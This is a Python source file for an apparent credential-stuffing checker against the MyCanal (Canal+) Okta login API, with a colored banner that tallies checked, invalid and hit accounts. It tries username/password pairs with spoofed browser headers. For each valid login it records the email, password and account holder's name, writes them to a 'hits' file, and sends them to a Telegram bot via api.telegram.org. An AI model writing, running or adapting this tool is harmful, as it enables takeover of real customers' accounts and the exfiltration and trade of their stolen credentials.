#:IMPORTING
import requests as r
import os
import datetime
#:LOGIN
def login(user, password):
    user = str(user).strip()
    password = str(password).strip()
    url = 'https://pass.canalplus.com/api/v1/authn'
    data = {"password": password, "username": user, "options": {
        "warnBeforePasswordExpired": True, "multiOptionalFactorEnroll": True}, "stateToken": ""}
    header = {
        'Host': 'pass.canalplus.com',
        'Connection': 'keep-alive',
        'sec-ch-ua': '"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"',
        'x-okta-user-agent-extended': 'okta-signin-widget-4.5.2',
        'accept-language': 'en',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.54 Safari/537.36',
        'accept': 'application/json',
        'sec-ch-ua-platform': '"Windows"',
        'Origin': 'https://pass.canalplus.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Length': '193'
    }
    try:
        Login = r.post(url=url, json=data, headers=header).json()
        if Login['status'] == 'SUCCESS':
            return Login
        else:
            return False
    except:
        return 'LoginError'


#:CHEck acc
class CheckMyCannal():
    def __init__(self, user, password):
        self._user = user
        self._password = password
        self._loginDone = login(self._user, self._password)

    def __ACCOUNT(self):
        firstName = self._loginDone['_embedded']['user']['profile']['firstName']
        lastName = self._loginDone['_embedded']['user']['profile']['lastName']
        Plan = 'Premium'
        status = self._loginDone['status']
        return f'''=== MY CANAL by => NOUREDIN_EKN  ===
============LOGIN INFO==============
EMAIL: {self._user}
PASSWORD: {self._password}
=============CAPTURE================
|-firstName : {firstName}
|-lastName : {lastName}
|-Plan : {Plan}
|-status : {status}
=====================================
|-TEAM:
    ====> @NKCP_TM 
|-Owner:
    ====> @nouredine_kn
|- DATE : {datetime.datetime.now().date()}
    '''
    #:GET ACC WORK

    def getAccount(self):
        if self._loginDone:
            return self.__ACCOUNT()
        else:
            return False
    #:SND HITs TO tG
    def tgSnd(self, token, id):
        if self._loginDone:
            r.get(
                f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={self.getAccount()}')
    #:SAVE HITS
    def saveText(self):
        if self._loginDone:
            if os.path.isdir('result'):
                name = f'[{datetime.datetime.now().date()}]hits-myCanal'
                if os.path.isdir(f'./result/{name}/'):
                    open(f'./result/{name}/hits-myCanal-Premium[Nouredine_kn].txt',
                         'a', encoding='utf-8').write(self.getAccount()+'\n')
                else:
                    os.mkdir(f'result/{name}')
                    open(f'./result/{name}/hits-myCanal-Premium[Nouredine_kn].txt',
                        'a', encoding='utf-8').write(self.getAccount()+'\n')
            else:
                name = f'[{datetime.datetime.now().date()}]hits-myCanal'
                os.mkdir('result')
                if os.path.isdir(f'./result/{name}/'):
                    open(f'./result/{name}/hits-myCanal-Premium[Nouredine_kn].txt',
                        'a', encoding='utf-8').write(self.getAccount()+'\n')
                else:
                    os.mkdir(f'result/{name}')
                    open(f'./result/{name}/hits-myCanal-Premium[Nouredine_kn].txt',
                    'a', encoding='utf-8').write(self.getAccount()+'\n')
# colors
class colors:
    R = '\033[91m'  # Red
    G = '\033[92m'  # Green
    Y = '\033[93m'  # Yellow
    B = '\033[94m'  # Blue
    P = '\033[95m'  # Purple
    C = '\033[96m'  # Cyan
    W = "\033[1;37m"  # White
    bold = '\033[1m'
    unbold = '\033[0m'
# banner
def banner(hits=0, bad=0, chk=0, tot=0):
    return f'''{colors.C} {colors.bold} 
       {colors.B} :::   :::  :::   :::  ::::::::      :::    ::::    :::     :::        :::  
      :+:+: :+:+: :+:   :+: :+:    :+:   :+: :+:   :+:+:   :+:   :+: :+:      :+:   
    +:+ +:+:+ +:+  +:+ +:+  +:+         +:+   +:+  :+:+:+  +:+   +:+  +:+     +:+    
  {colors.C}+#+  +:+  +#+    +#++:   +#+        +#++:++#++: +#+ +:+ +#+  +#++:++#++:   +#+     
  +#+       +#+     +#+    +#+        +#+     +#+  +#+  +#+#+#  +#+     +#+   +#+      
 #+#       #+#      #+#    #+#    #+# #+#     #+#  #+#   #+#+#  #+#     #+#   #+#       
###       ###       ###     ########  ###     ### ###    ####   ###     ###   ########## 
                                                                                                                       
        {colors.Y}MY CANAL V 1.0.0 BY NOUREDINE KN                                                                 
        {colors.bold} {colors.Y} [ {colors.R}! {colors.Y}] {colors.P} DEV BY:  {colors.G} NOUREDINE KN 
        {colors.bold} {colors.Y} [ {colors.R}! {colors.Y}] {colors.P}TG-USER:  {colors.G} t.me/n2k4n
        {colors.bold}{colors.Y} [ {colors.R}! {colors.Y}] {colors.P}github: {colors.G}  github.com/nouredinekn
        {colors.bold}{colors.Y} [ {colors.R}! {colors.Y}] {colors.P}DATE: {colors.G}{datetime.datetime.now().date()} 
        {colors.B}=================[NKCP]====================
        {colors.P} CHECKED : {colors.Y}{chk} / {tot}
        {colors.R} INVALIDE: {bad}
        {colors.G} HITS:    {hits}
        {colors.W} 
'''
# clear
def clear():
    return os.system("cls")
